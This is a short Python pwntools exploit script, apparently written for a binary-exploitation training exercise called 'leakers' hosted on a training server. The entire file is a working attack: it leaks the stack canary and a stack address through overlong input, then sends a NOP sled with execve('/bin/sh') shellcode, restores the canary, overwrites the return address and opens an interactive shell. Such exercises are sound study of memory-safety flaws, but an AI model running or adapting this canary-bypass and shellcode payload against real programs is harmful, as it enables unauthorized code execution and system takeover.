from pwn import *
import sys
 
context.clear(arch='amd64',os='linux')

if(len(sys.argv)>1):
	run_local = False
else:
	run_local = True

print(run_local)
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/leakers')
	#pid=gdb.attach(r)
	#input("wait")
else:
	r=remote("bin.training.jinblack.it",2011)

input("wait")
ret=r.recv_raw(200)
input('Send bad string')
shellcode = b"\x90"*105
r.send(shellcode)


ret=r.recv_raw(200)
ret=ret[107:]
ret= ret[:len(ret)-3]
canary=ret
print(canary)


input("Leak the stack")
payload_to_leak_stack=b'B'*(104 + 4*8)
r.send(payload_to_leak_stack)
ret=r.recv_raw(190)
ret=u64(ret[138:]+b'\x00\x00')
delta= 0x158
address= ret-delta+1
print(p64(address))



#input('wait')
#r.send(b'\x90'*104+b'\x00'+ret+p64(0x1)+p64(0x404080))


sc = b'\x48\x31\xd2\x48\x31\xf6\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05/bin/sh\x00'

input('Revive canary and overwrite return address')
shellcode = b"\x90"*69+sc+b'\x00'+canary+b'\x50'*8+p64(address)
r.send(shellcode)
r.interactive()
